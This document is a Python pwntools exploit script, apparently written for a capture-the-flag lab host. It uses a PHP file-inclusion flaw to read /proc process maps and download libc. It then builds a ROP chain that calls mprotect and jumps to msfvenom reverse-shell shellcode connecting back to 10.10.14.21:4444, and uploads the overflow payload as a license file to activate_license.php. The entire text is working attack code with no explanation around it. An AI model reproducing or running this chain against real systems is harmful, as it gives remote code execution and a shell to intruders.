import requests
import re
import struct
from pwn import *

offset = 520

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64

base_url = "http://10.10.11.154/"
base_url_lfi = base_url + "index.php?page=php://filter/resource="

pid = 0
while pid == 0:
    for i in range(300, 500):
        response = requests.get(base_url_lfi + '/proc/' + str(i) + '/cmdline')
        if response.text:
            print(i)
            pid = i
            if response.text == "/usr/bin/activate_license\x001337\x00":
                response = requests.get(base_url_lfi + '/proc/' + str(i) +  '/maps')
                print(response.text)
                libc_base = int(re.search(".*/libc.*", response.text, re.M)[0].split(" ")[0].split("-")[0], 16)
                libc_path = re.search(".*/libc.*", response.text, re.M)[0].split(" ")[-1]
                stack_base = int(re.search(".*stack.*", response.text, re.M)[0].split(" ")[0].split("-")[0], 16)
                stack_end = int(re.search(".*stack.*", response.text, re.M)[0].split(" ")[0].split("-")[1], 16)
                sqlite_base = int(re.search(".*libsqlite3.*", response.text, re.M)[0].split(" ")[0].split("-")[0], 16)
                shellcode = open('revshell', 'rb').read() #msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.21 LPORT=4444 -o revshell
                libc = requests.get(base_url_lfi + libc_path)._content
                with open('/tmp/libc', 'wb') as f:
                    f.write(libc)
                rop = ROP('/tmp/libc')
                libc_so = ELF('/tmp/libc')
                pop_rsi = libc_base + rop.rsi.address
                pop_rdi = libc_base + rop.rdi.address
                pop_rdx = libc_base + rop.rdx.address
                
                mprotect = libc_base + libc_so.symbols['mprotect']
                
                # wget http://10.10.11.154/index.php?page=php://filter/resource=/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 -O libsqlite3.so.0.8.6
                jmp_rsp = sqlite_base + 0x00000000000d431d # ROPgadget --binary libsqlite3.so.0.8.6 | grep -i "jmp rsp"
                
                payload = [
                    b'C' * 520,
                    p64(pop_rdi),
                    p64(stack_base),
                    p64(pop_rsi),
                    p64(stack_end - stack_base),
                    p64(pop_rdx),
                    p64(0x7),
                    p64(mprotect),
                    p64(jmp_rsp),
                    shellcode,
                ]
                
                payload = b"".join(payload)
                with open('payload_upload', 'wb') as up:
                    up.write(payload)
                response = requests.post(base_url + 'activate_license.php', files={"licensefile": payload})
                print(response.text)
                break
        else:
            continue
